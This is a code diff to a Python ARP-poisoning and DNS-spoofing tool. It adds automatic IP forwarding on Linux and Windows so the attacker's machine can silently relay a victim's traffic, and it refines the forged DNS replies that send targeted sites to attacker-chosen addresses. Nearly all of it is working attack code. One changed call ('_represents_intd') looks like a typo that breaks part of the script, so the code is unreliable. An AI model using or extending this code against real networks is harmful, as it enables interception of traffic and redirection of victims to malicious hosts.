@@ -8,6 +8,7 @@ import sys
 import traceback
 import threading
 import platform # to support windows and linux
+import win32serviceutil # to turn on/off IP forwarding on Windows
 
 """
 ARP poisoning is the act of altering the ARP table of another device on the network (for malicious purposes)
@@ -154,7 +155,9 @@ class ARPP(object):
     def select_interface(self):
         if self.system_os == 'Windows':
             self.select_interface_windows()
-        elif self.system_os == 'Linux':
+        elif self.system_os in ['Linux', "Mac"]:
+            self.select_interface_linux()
+        else: # try to use the linux interface selection if system_os is not considered in if-statement
             self.select_interface_linux()
         
     def select_interface_linux(self):
@@ -211,7 +214,7 @@ class ARPP(object):
                 #get_windows_if_list()[4]['name']
             else:
                 print("[-] Interface does not exist\n")
-        elif not self._represents_int(answer):
+        elif not self._represents_intd(answer):
             ifs_names = [if_dict['name'] for if_dict in if_list]
             if answer in ifs_names:
                 self.SELECTED_INTERFACE = IFACES.dev_from_name( answer )
@@ -241,7 +244,69 @@ class ARPP(object):
         # if there are no replies found, let the user know
         if results.res == []:
             print("[-] No network devices found\n")
+
+    def _ip_routing_linux_onoff(self, switch):
+        """This method turns the IP forwarding on (switch=1) or off (switch=0). 
+        On linux it's easy to turn IP forwarding on/off.
+        We need to access the ip_forwarding file in the system configuartions, and change the value it contains (either 0 or 1).
+
+        Args:
+            switch (int): 1 to turn IP forwarding on, 0 to turn IP forwarding off.
+        """
+        # the following path points to a file containing a 1 if ip_routing is enabled and 0 otherwise
+        path = "/proc/sys/net/ipv4/ip_forward"
+        with open(path) as f:
+            if f.read()=="{}".format(switch):
+                return
+        with open(path, "w") as f: # replaces the content in the file with new content
+            f.write("{}".format(switch))
         
+    def _ip_routing_windows_onoff(self, switch):
+        """There are two ways of enabling/disabling IP forwarding on Windows, using either one of the modules:
+        >>> import winreg
+        >>> import win32serviceutil
+        
+        With the winreg module we may change the value of IPEnableRouter to 1 or 0 in order to turn on/off IP forwarding.
+        With the win32serviceutil module we may start or stop the RemoteAccess (or SharedAccess, I don't know for sure) to turn on/off IP forwarding.
+        Note that both modules require root privileges. 
+        There is no difference between these modules besides the fact that the winreg module is a low level 
+        module and the win32serviceutil is high level module (and thus a bit safer). The win32serviceutil module provides a more 
+        standardised way of starting a windows service and hence we chose to use the win32serviceutil. 
+        
+        Args:
+            switch (int): 1 to turn IP forwarding on, 0 to turn IP forwarding off.
+        """
+        # Get the current status of the Internet Connection Sharing (ICS) service
+        service_name = "SharedAccess"
+        status = win32serviceutil.QueryServiceStatus(service_name)[1]
+        
+        try:
+            if switch == 1:
+                print("[i] Turning IP forwarding on...")
+                # if status is not 4 then it's not on, so we must turn it on
+                if status != 4: 
+                    win32serviceutil.StartService(service_name)
+                    print("[+] IP forwarding turned on")
+                else:
+                    print("[+] IP forwarding already turned on")
+            elif switch == 0:
+                print("[i] Turning IP forwaring off...")
+                # if status is 4 then it's on, and we must want to turn it off
+                if status == 4: 
+                    win32serviceutil.StopService(service_name)
+                    print("[+] IP forwarding turned off")
+                else:
+                    print("[+] IP forwarding already turned off")
+        except:
+            print("[-] Failed to turn IP forwarding on/off")
+    
+    def _ip_routing_onoff(self, switch):
+        if self.system_os.lower() == "windows":
+            self._ip_routing_windows_onoff(switch=switch)
+        elif self.system_os.lower() in ["linux", "mac"]:
+            self._ip_routing_linux_onoff(switch=switch)
+    
+    
     def ARP_poison(self, ipVictim = "", ipToSpoof = ""):
         """
         Victim's arp table will contain the following entry
@@ -256,6 +321,7 @@ class ARPP(object):
             ipToSpoof (str): IP address that our MAC address needs to be associated with in the victim's ARP table
         """
         self._assure_interface_is_selected()
+        self._ip_routing_onoff(switch=1) # turn on IP forwarding
         
         while not self._is_valid_ip(ipVictim):
             try:
@@ -386,19 +452,20 @@ class ARPP(object):
         # this function is called on each packet in the sniff call further ahead
         def packet_callback(packet):
             # this is just for debugging purposes on the linux machine
-            if DNS in packet and DNSQR in packet and IP in packet and packet[IP].src == ipVictim:
-                print("DNS in packet: {}".format(DNS in packet)) 
-                print("DNS request for targeted site: {}".format(any([target_site in str(packet[DNSQR].qname) for target_site in target_sites.keys()]) ))
-                print("Packet operation code is 0: {}".format(packet[DNS].opcode==0))
+            # if DNS in packet and DNSQR in packet and IP in packet and packet[IP].src == ipVictim:
+            #     print("DNS in packet: {}".format(DNS in packet)) 
+            #     print("DNS request for targeted site: {}".format(any([target_site in str(packet[DNSQR].qname) for target_site in target_sites.keys()]) ))
+            #     print("Packet operation code is 0: {}".format(packet[DNS].opcode==0))
             def send_spoofed_response():
                 # first we check if the packet is one that needs to be spoofed
                 if  (DNS in packet)\
                         and (IP in packet)\
                         and (packet[IP].src == ipVictim)\
                         and (packet[DNS].opcode==0)\
+                        and (UDP in packet)\
                         and (DNSQR in packet)\
                         and ( any([target_site in packet[DNSQR].qname.decode("utf-8") for target_site in target_sites.keys()]) ):
-                    # if it's a DNS request and it's coming from the victim and it's a QUERY (i.e. opcode=0) then send fake reply
+                    # the previous if-statement checks if it's a DNS request and it's coming from the victim and it's a QUERY (i.e. opcode=0), if so then send fake reply
                     print("[+] Caught DNS request from {} for {}".format(packet[IP].src, packet[DNSQR].qname.decode("utf-8")))
                     
                     # we read the site the victim is trying to access and map the site to the spoofed IP given by our target_sites dictionary 
@@ -406,7 +473,8 @@ class ARPP(object):
                     fake_ip = list(target_sites.values())[index_of_target_site]
                     
                     # create a fake DNS reply packet
-                    fake_DNS_reply = IP(dst=packet[IP].src)\
+                    #!!!#!!!#!!!#     maybe it is missing the right flags for it to be meaningful to the victim device
+                    fake_DNS_reply = IP(dst=packet[IP].src, src=packet[IP].dst)\
                         /UDP(dport=packet[UDP].sport, sport=53)\
                         /DNS(id=packet[DNS].id,ancount=1,an=DNSRR(rrname=packet[DNSQR].qname, rdata=fake_ip))\
                         /DNSRR(rrname=packet[DNSQR].qname, rdata=fake_ip)
@@ -417,7 +485,7 @@ class ARPP(object):
             send_spoofed_response()
                         
         # in order to keep the GUI running for the user of this script, we create a thread that executes the DNS spoofing
-        # the threading.Event() is used to stop the thread when the user wants
+        # the threading.Event() is used to stop the thread when the user wants (by using e.set())
         e=threading.Event()
         def rec(event):
             while True:
@@ -441,7 +509,7 @@ class ARPP(object):
         if self.THREADED_TASKS != []:
             print("[+] closing threads... please wait\n")
             for e in self.EVENTS:
-                    e.set()
+                e.set()
             del self.EVENTS
             del self.THREADED_TASKS
             self.EVENTS = []
